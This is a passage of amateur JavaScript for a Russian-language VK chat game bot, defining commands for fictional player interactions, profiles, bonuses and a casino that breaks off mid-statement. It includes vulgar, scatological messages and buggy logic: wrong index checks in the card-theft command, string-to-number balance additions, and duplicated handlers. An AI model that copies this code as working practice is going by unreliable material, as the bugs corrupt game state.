	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` Игрок ${user.prefix} показал Вам жопу !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы показали жопу игроку [${acc.users[message.$match[1]].prefix}]`);
});
vk.updates.hear(/^(?:Кке43инуе43е43е43е43ть)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ккинуть ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` Игрок ${user.prefix} кинул вам в морду камень !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы кинули в морду камень игроку [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:Ксчуцйак3а43й4й3инуть)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ккинуть ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` Игрок ${user.prefix} кинул вам в морду камень !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы кинули в морду камень игроку [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:Цветы)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: цветы ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `💐 Игрок ${user.prefix} подарил Вам цветы !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💐 Вы подарили цветы игроку [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:Спасибо)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: Спасибо ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Игрок ${user.prefix} сказал Вам спасибо !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы сказали спасибо игроку [${acc.users[message.$match[1]].prefix}]`);
});	

vk.updates.hear(/^(?:сохра)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: сохра ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		attachment: "album-46547947_253002489", 
		message: `Игрок ${user.prefix} показал Вам сохру !` ,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы показали игроку сохру: [${acc.users[message.$match[1]].prefix}]` , { attachment: "album-46547947_253002489" }); 
});	


vk.updates.hear(/^(?:кукрасть)\s?([0-9]+)?\s?([0-9]+)?\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(` ➾ Пример команды: кукрасть ID [пороль] [сумма]`);
	if(!Number(message.$match[1])) return message.send(` ➾ Число должно быть цифрового вида.`);
	if(acc.users[message.$match[2]].upis15 != message.$match[2]) return message.send(`Не верный пороль карты !`);
	if(acc.users[message.$match[3]].karta < message.$match[3]) return message.send(`У игрока нет 50.000 $ на карте !`);
	if(!acc.users[message.$match[1]]) return message.send(` ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].karta -= message.$match[3]
	user.balance += message.$match[3]		
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы украли деньги с карты игрока [${acc.users[message.$match[1]].prefix}]`);
});
vk.updates.hear(/^(?:насрать)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 7) return message.send(`❗ Доступно с 7 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(!message.$match[1]) return message.send(` ➾ Пример команды: насрать ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.volff5 < 70) return message.send(`💩 Вы не хотите срать ! Посмотреть свои потребности можно командой " пстатик "`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	user.volff5 = 0;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` игрок ${user.prefix} насрал на вас!`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы насрали на [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:позор)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 1) return message.send(`❗ Доступно с 7 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(!message.$match[1]) return message.send(` ➾ Пример команды: позор ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `ИГРОК ${user.prefix} ОПОЗОРИЛ ВАС ПО ПОЛНОЙ !▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ( ВЫ ЛОЛ ) ( ВЫ ЛОЛ ) ( ВЫ ЛОЛ ) ( ВЫ ЛОЛ ) ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  ▀▄ ▀▄ ▀▄ ▀▄  `,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`ВЫ ОПОЗОРИЛИ ИГРОКА [${acc.users[message.$match[1]].prefix}]▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ ▀▄ `);
});	
vk.updates.hear(/^(?:описать)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 1) return message.send(`❗ Доступно с 1 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(!message.$match[1]) return message.send(` ➾ Пример команды: описать ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.volff5 < 70) return message.send(`💩 Вы не хотите в писать ! Посмотреть свои потребности можно командой " пстатик "`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	user.volff5 = 0;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `💦 игрок ${user.prefix} написал на вас!`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💦 Вы написали на игрока[${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:Убить)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 7) return message.send(`❗ Доступно с 7 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(message.$match[1]== user_id(message.user)) return message.send(`⚠ ➾ Вы указали свой ID !`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: убить ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.gun_name == false)	 return message.send(`🔫 ➾ У вас нет оружия.`)
		if(user.balance < 50000) return message.send(`🔸 ➾ Вы бомж !`);
	if(user.ahahah < 50) return message.send(`🔸 ➾ У вас не достаточно здоровья ! ( нужно 50 % )`);
	if(acc.users[message.$match[1]].fggg == 10) return message.send(`Игрок спрятался !`);
	if(acc.users[message.$match[1]].ahahah < 50) return message.send(`❤ У игрока не достаточно здоровья !`);
	if(acc.users[message.$match[1]].balance < 50000) return message.send(`Данный игрок бомж!`);
	if(user.bloks.pari == true) return message.send(`⚠ Убивать можно раз в 5 минут !`);
	user.bloks.pari = true
	setTimeout(() => {
		user.bloks.pari = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `Вы снова можете тырить !` ,random_id: 0
		});
	}, 300000);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	if(rand(0,1) == 0){
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `🔪 Вас кто-то убил ! Вор забрал у вас 50.000 $ и 50 % здоровья !`,random_id: 0
		});
		acc.users[message.$match[1]].ahahah -= 50; 
		acc.users[message.$match[1]].balance -= 50000;
		user.balance += 50000;	
		user.ahahah += 50;
		user.volff10 += 1;
		user.upis2 += 1;
		return message.send(`Вы успешно убили данного игрока ! ( + 50.000 , + 50 % здоровья )`);
	}else{
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `🔪 Игрок ${user.prefix} попытался Вас убить, ну у него этого не получилось ! Вы смогли убить его и вам начислено 50.000 $ , + 50 % здоровья )`,random_id: 0
		});
		user.balance -= 50000;	
		user.ahahah -= 50;
		acc.users[message.$match[1]].ahahah += 50; 
		acc.users[message.$match[1]].balance += 50000;
		return message.send(`Игрок смог убить Вас ! ( - 50.000 $ , + 50 % здоровья )`);
	}
	
});	
vk.updates.hear(/^(?:смашина)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(!message.$match[1]) return message.send(`🚘 ➾ Пример команды: смашина ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.cars == false) return message.send(`🚘 У вас нет машины !`);  
	if(acc.users[message.$match[1]].fggg == 10) return message.send(`Игрок спрятался !`);
	if(user.bloks.sssss1111 == true) return message.send(`🚘 Попробуйте через 15 минут !`);
	user.bloks.sssss1111 = true
	setTimeout(() => {
		user.bloks.sssss1111 = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `!` ,random_id: 0
		});
	}, 300000);
	if(!acc.users[message.$match[1]]) return message.send(`🚘 ➾ Такого игрока нет!`);
	if(rand(0,1) == 0){
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `🚘 Вас кто-то задовил !`,random_id: 0
		});
		user.balance += 10000;	
		return message.send(`Вы успешно задовили данного игрока ! ( + 10.000 $ бонусных)`);
	}else{
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: ``,random_id: 0
		});
		return message.send(`🚘 Игрок смог увернуться от вашей телеге !`);
	}
	
});	

	/////////////////
	vk.updates.hear(/^(?:Ударить)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(message.$match[1]== user_id(message.user)) return message.send(`⚠ ➾ Вы указали свой ID !`)
			if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ударить ID`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(user.ahahah < 50) return message.send(`🔸 ➾ У вас не достаточно здоровья ! ( нужно 50 % )`);
		if(acc.users[message.$match[1]].fggg == 10) return message.send(`Игрок спрятался !`);
		if(acc.users[message.$match[1]].ahahah < 50) return message.send(`❤ У игрока не достаточно здоровья !`);
		if(user.bloks.pari == true) return message.send(`⚠ Драться можно раз в 5 минут !`);
		user.bloks.pari = true
		setTimeout(() => {
			user.bloks.pari = false
			vk.api.call('messages.send', {
				peer_id: user.id,
				message: `Вы снова можете драться !` ,random_id: 0
			});
		}, 300000);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
		if(rand(0,1) == 0){
			vk.api.call('messages.send', {
				peer_id: acc.users[message.$match[1]].id,
				message: `${user.prefix} забил вас кулаками ! ( - 50 % здоровья )`,random_id: 0
			});
			acc.users[message.$match[1]].ahahah -= 50; 
			user.ahahah += 50;
			return message.send(`Вы успешно забили данного игрока ! (+ 50 % здоровья )`);
		}else{
			vk.api.call('messages.send', {
				peer_id: acc.users[message.$match[1]].id,
				message: ` Игрок ${user.prefix} попытался Вас забить, ну у него этого не получилось ! Вы смогли убить его и вам начислено + 50 % здоровья )`,random_id: 0
			});	
			user.ahahah -= 50;
			acc.users[message.$match[1]].ahahah += 50; 
			return message.send(`Убил Вас (`);
		}

	});	
	

	

	vk.updates.hear(/^(?:Снежок)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(message.$match[1]== user_id(message.user)) return message.send(`⚠ ➾ Вы указали свой ID !`)
			if(!message.$match[1]) return message.send(`❄⛄ Пример команды: снежок ID`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(user.perp < 1) return message.send(`❄ У вас нет снежков ! Чтобы слепить, напишите " слепить "`);
		if(acc.users[message.$match[1]].fggg == 10) return message.send(`Игрок спрятался !`);
		if(!acc.users[message.$match[1]]) return message.send(`❄⛄ Такого игрока нет!`);
		acc.users[message.$match[1]].shel = 0; 
		user.perp -= 1;
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `❄⛄ Игрок ${user.prefix} кинул в Вас снежок !\nЧтобы спрятаться, напиши " Спрятаться "`,random_id: 0
		});
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		return message.send(`❄⛄ Вы кинули снежок в морду [${acc.users[message.$match[1]].prefix}]`);
	});

	vk.updates.hear(/^(?:пварн)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: пварн [ID] [ПРИЧИНА]`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(user.balance < 15000) return message.send(`🔸 ➾ У вас нет 15.000 $ !`);
		user.balance -= 15000;
		let a = zapret(message.$match[1]);
		if(a != 0) return message.send(a)
			if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);

		logs(user_id(message.user), message.$match[1], message.$match[2], type = 6)

		var is = [user_id(message.user), message.text] 
		adm_log(is)

		let text = `✅ ➾ ${user.prefix} выдал вам warn(предупреждение)\nОбжаловать можно тут: https://vk.com/topic-181438458_39576334`
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,random_id: 0
		});
		return message.send(`✅ ➾ Вы выдали предупреждение игроку [${acc.users[message.$match[1]].prefix}].\n-15.000 $ за пранк !`);
	}); 

	vk.updates.hear(/^(?:сдо!!!!а)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: реф ID`);
		if(message.$match[1]== user_id(message.user)) return message.send(`⚠ ➾ Вы указали свой ID , а нужно указывать ID друга !`)
			if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(user.podarki < 10) return message.send(`Вы уже вводили реф!`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
		acc.users[message.$match[1]].balance += 150000; 
		acc.users[message.$match[1]].baba += 1;
		acc.users[message.$match[1]].ima += 1;
		acc.users[message.$match[1]].kkk += 1;
		user.balance += 150000;	
		user.donate += 10;
		user.podarki = 1;		
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `⚠[Рефка]: ${user.prefix} указал ваш ид и вы получили 150.000 $ !`,random_id: 0
		});
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		return message.send(`Вы ввели ID , друга [${acc.users[message.$match[1]].prefix}] и получили 150.000 $ !`);
	});






	vk.updates.hear(/^(?:Бот)/i,  (message) => {
		let stick = [11257,10343,11269,10373,7332,8758,7498,9935].random();
		message.send({sticker_id: stick});
	});
	vk.updates.hear(/^(?:фхелп)$/i, (message) => {
		let dev = '';   
		return message.send(`
			♻
			Собрать - собрать биткоины
			фпродать - продать ферму ( 30.000.000 $ )

			`);
	});
	///////////////////////////////
	vk.updates.hear(/^(?:ферма)$/i, (message) => {
		let dev = '';   
		return message.send(`
			👉 ➾ МАЙНИНГ ферма:
			♻ Ферма " теплые яйца "
			⚡ Информация: 
			👾 Биткоинов в час: 1 - 1000
			💸 Стоимость: 80.000.000 $

			Чтобы купить данную ферму, напиши команду " buyferm "
			
			
			Чтобы посмотреть команды ЭЛИТНОЙ майнинг фермы, напишите " эферма "
			
			`);
	});
	////////////////////////////
	vk.updates.hear(/^(?:беседы)$/i,  (message) => { 
		return message.send(`
			📘 ➾ Ссылки на наши беседы:

			`);
	});


	///////////////////////
	vk.updates.hear(/^(?:беседы)$/i,  (message) => {  
		return message.send(`
			📘 ➾ Ссылки на наши беседы:

			`);
	});

	vk.updates.hear(/^(?:беседы)$/i,  (message) => {  
		return message.send(`
			📘 ➾ Ссылки на наши беседы:

			`);
	});

/////
vk.updates.hear(/^(?:баланс)/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`
		🔸 ➾ ID: ${user_id(message.user)} 
		💴 ➾ Баланс ${spaces(user.balance)}$ 
		💴 ➾ Биткоинов ${spaces(user.bitcoin)}$ 
		🔸 ➾ Рубинов: ${spaces(user.donate)} 
		🔸 ➾ Уровень: ${user.lvl} 
		👑 ➾ Рейтинг: ${spaces(user.global_exs)}`
		)

});
vk.updates.hear(/^(?:тсинфо)/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.cars == false) return message.send(`🚘 ➾ У вас нет машины`)
		return message.send(`
			Бензин: ${spaces(user.alm565in )} л
			`
			)

});
vk.updates.hear(/^(?:Рюкзак)/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`
		❗ В рюкзаке хранятся особые, простые и редкие предметы, которые можно продать за столь выгодную сумму:

		🦋 Фири бабочек: ${spaces(user.almidfadfdn)} 
		🐓 Голов петуха: ${spaces(user.almidfsan)}
		🧂 Баночка спермы: ${spaces(user.almindfs)}`
		)

});

//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===






vk.updates.hear(/^(?:свадьба)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)]; 
	if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
	if(user.brak != false) return message.send(`🙅 ➾ Вы уже женаты.`);
	if(!acc.users[message.$match[1]]) return message.send(`🚶 ➾ Такого игрока нет.`);
	if(acc.users[message.$match[1]].ffffsasa == false) return message.send(`🙅 ➾ У данного игрока нет паспорта !`);
	if(acc.users[message.$match[1]].brak != false) return message.send(`🙅 ➾ Этот игрок уже женат!`);
	user.brak = Number(message.$match[1]);
	acc.users[message.$match[1]].brak = user_id(message.user);
	return message.send(`➖➖➖➖➖\n⚠ ➾ - - - - [ВНИМАНИЕ] - - - - <<⚠\n👫 ➾ Поздравим молодоженов: \n👫 ➾ -->> ${user.prefix} и ${acc.users[message.$match[1]].prefix} <<--\n➖➖➖➖➖`)
});

vk.updates.hear(/^(?:развод)/i, (message) => {  
	let user = acc.users[user_id(message.user)]; 
	if(user.brak == false) return message.send(`🙅 ➾ Вы не женаты.`); 
	acc.users[user.brak].brak = false;
	user.brak = false;
	return message.send(`👫 ➾ Вы успешно развелись.`)
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// pre F i X clo


vk.updates.hear(/^(?:профиль|проф|гей|💻 Профиль)\s?([0-9]+)?/i, (message) => { 
	let cars = [0, 'Mercedes S-Class','Volkswagen Phaeton','Lexus LS 430','Skoda Rapid','Audi A8','Range Rover','BMW X6','Porsche Cayenne','BMW 7 Series','Lexus LX']
	let hel = [0, 'Agusta A129 Mangusta','Ми-24','AH-2','CAIC WZ-10','HAL LCH','Eurocopter Tiger','Ка-52','Apache']
	let air = [0, 'Fokker DR1 Triplane','Mitsubishi A6M Zero','Су-35С']
	if (message.$match[1] == 1) {
		message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
		return message.sendSticker(13475);
	} 
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let warns = '';
	for(i=0;i<user.warn_p.length;i++){warns += `⛔ ➾ ${user.warn_p[i]}\n`}

		if(!message.$match[1]){
			return message.send(`
				┇💻┇» Ваш ник: [${user.prefix}] 
				┇🐩┇» Цифровой: [${message.user}] 
				┇🆔┇» ID: [${user_id(message.user)}]
				┇🍼┇» Возраст: [${spaces(user.zolos)} лет]
				┇👤┇» Опыт: [${spaces(user.upis56456456)}]
				┇💢┇» Уровень: [${spaces(user.upis65465465)}]
				┇🚫┇» Жалоб: [${spaces(user.almin23)}]
				┇🔸┇» Дата регистрации: [${user.rtime}] 
				┇🌀┇» Аккаунт:\n` + (user.spid == false ? `🛑 Не подвержден \n` : `» ✅Подтвержден  ✅\n`)+ `
				┇💸┇» Баланс: [${spaces(user.balance)}$] 
				` + 
				(user.banan5 == false ? `┇🔑┇» Префикс : отсутствует\n` : `┇🔑┇» Префикс: ${user.banan5}\n`)+ 
				`  
				┇💽┇» Биткоинов: [${spaces(user.bitcoin)}] 
				┇💎┇» Рубинов: [${spaces(user.donate)}] 
				┇👑┇» Рейтинг: [${spaces(user.global_exs)}] 

				` + 
				(user.aircraft == false ? `✈ ▻ Самолет: отсутствует\n` : `┋✈┋»  Самолет: ${air[user.aircraft]}\n`)+ 
				(user.helicopter == false ? `🚁 ▻ Вертолет: отсутствует\n` : `┋🚁┋»   Вертолет: ${hel[user.helicopter]}\n`)+ 
				(user.cars == false ? `🚘 ▻ Автомобиль: отсутствует\n` : `┋🚘┋»  Автомобиль: ${cars[user.cars]}\n`)+ 
				(user.lodka == false ? `🚤 ▻ Лодка: отсутствует\n` : `┋🚤┋» Лодка: ${user.lodka}\n`)+ 
				(user.house == false ? `🏡 ▻ Дом: отсутствует\n` : `┋🏡┋» Дом: ${user.house}\n`)+  
				(user.cvb == false ? `💻 ▻ Комп : отсутствует\n` : `┋💻┋»  Комп: ${user.cvb}\n`)+ 
				` 

				┇👒┇»Привилегия: ${user.ap.toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}

				┇⚠ ┇ Предупреждений: [${user.warn}] 
				┇⚠┇ Причины: ${warns} 

				` +(user.pit== false ? `┋🐼┋»  Питомец: отсутствует\n` : `┋🐼┋»  Питомец: ${user.pit}\n`)+ 
				`  

				┇🔫┇» Оружие: 
				`+(user.gun_name == false ? `🔫» Отсутствует\n` : `🔫» Название: ${user.gun_name}\n`)+ 
				` 
				┇🔫┇» Урон: ${user.uron} 
				┇❤┇» Здоровье: ${user.ahahah}   
				`)	
		}else{
			if(!Number(message.$match[1]) || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
			if(acc.users[message.$match[1]].banan17 == true) return message.send(`Профиль закрыт !`);
			let id = acc.users[message.$match[1]]
			return message.send(`
				📋 Информация об игроке [${id.prefix}] 📋
				🔸 ➾ Имя: ${id.prefix}
				🔹 ➾ ID: ${message.$match[1]}
				🔹 ➾ VK: @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})
				🔹 ➾ Баланс: ${spaces(id.balance)}
				🔹 ➾ Рубинов: ${spaces(id.donate)}
				🔹 ➾ Привилегия: ${id.ap.toString().toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}
				` +
				(id.brak == false ? `💖 ➾ Не женат\n` : `💖 ➾ Муж/жена:   ${acc.users[id.brak].prefix}\n`)+
				`
				🔫 ➾ Оружие:
				`+(id.gun_name == false ? `🔫 ➾ Отсутствует\n` : `🔫 ➾ Название: ${id.gun_name}\n`)+  
				` 
				🔫 ➾ Урон: ${id.uron}
				❤ ➾ Здоровье: ${user.ahahah}
				`);
		}

	});









/////////////////////////////////////////////

	///////////////
	vk.updates.hear(/^(?:халява)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.upis65465465 > 3) return message.send(`Халява доступна новичкам до 3 лвл ! `);
		if(user.bloks.sssss12 == true) return message.send(`Вы уже получали бонус ! Попробуйте завтра ! `);
		user.bloks.sssss12 = true
		setTimeout(() => {
			user.bloks.sssss12 = false
			vk.api.call('messages.send', {
				peer_id: user.id,
				message: `Вам снова доступен бонус ! Напиши " халява "` ,random_id: 0
			});
		}, 86400000);
		let balan = rand(0, 100000);
		user.balance += balan;
		user.upis56456456 += 7;
		return message.send(`Вы получили халяву !`, { attachment: "photo-178754644_456239017" 
	});	

	});
	vk.updates.hear(/^(?:эпикхалява)/i, (message) => { 
		var user = acc.users[user_id(message.user)]; 
		vk.api.users.get({user_id: message.user, fields: "sex"}).then((res) => { 
			var e = res[0]; 
			if(e.sex == 2) return message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), эпический кейс доступен только девушкам!`) 
				if(user.bloks.dlis == true) return message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы уже получали бонус! Попробуйте завтра!`); 
			user.bloks.dlis = true 
			setTimeout(() => { 
				user.bloks.dlis = false 
				vk.api.call('messages.send', {peer_id: user.id, message: `@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вам снова доступен бонус! Напиши "халява"`,random_id: 0}); 
			}, 86400000); 
			var count = rand(1,2); 
			user.aldfsfdsamin += count;
			var is = [user_id(message.user), message.text] 
			adm_log(is)
			return message.send(`@id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы получили эпических кейса: ${count} ( " эоткрыть " ).`, { attachment: "photo-178754644_456239017" 
		}); 
		}); 
	});
	


	vk.updates.hear(/^(?:бонус|🔑 Бонус)/i, (message) => { 
		let user = acc.users[user_id(message.user)]; 

let prize = [1,2,3].random(); // Рандомит приз 
let sid = 8484 // Стикер 

let bit = rand(500,10000); 
let reit = rand(1,25); 
let doll = rand(100000000,1000000000); 

if(user.bloks_bonus > getUnix()) return message.send(`Бонус можно получить через: ${unixStampLeft(user.bloks_bonus - Date.now())}`); // Лимит 

// Призы бонуса 
if(prize == 1){ 
	user.bitcoin += bit; 
	message.send(`На ваш баланс было зачислено ${spaces(bit)}฿`); 
	message.send({sticker_id: sid}); 
} 
if(prize == 2){ 
	user.global_exs += reit; 
	message.send(`На ваш баланс было зачислено ${spaces(reit)}👑!\n-- 👑 Ваш Рейтинг: ${spaces(user.global_exs)}`); 
	message.send({sticker_id: sid}); 
} 
if(prize == 3){ 
	user.balance += doll; 
	message.send(`На ваш баланс было зачислено ${spaces(doll)}$!\n -- 💳 Ваш Баланс: ${spaces(user.balance)}`); 
	message.send({sticker_id: sid}); 
} 
user.bloks_bonus = getUnix() + 86466000
}); 



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

vk.updates.hear(/^(?:казино|азино)\s?([^\s  ].*)?/i, (message) => {
	var user = acc.users[user_id(message.user)];
	var amount = Number(parserInt(message.$match[1]));
	amount = Math.round(amount);

	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), используйте: «казино [ставка]» 😒`);
	if(amount < 1) return message.send(`🔸 @id${user.id}(${user.prefix}), ставка должна быть не менее 1$`)
		if(amount > user.balance) return message.send(`@id${user.id}(${user.prefix}), недостаточно денег 😒\n 💰 Баланс: ${spaces(user.balance)}`)

			if(message.$match[1].toLowerCase() == 'все' || message.$match[1].toLowerCase() == 'всё' || message.$match[1].toLowerCase() == 'вабанк' || message.$match[1].toLowerCase() == 'вобанк'){ 
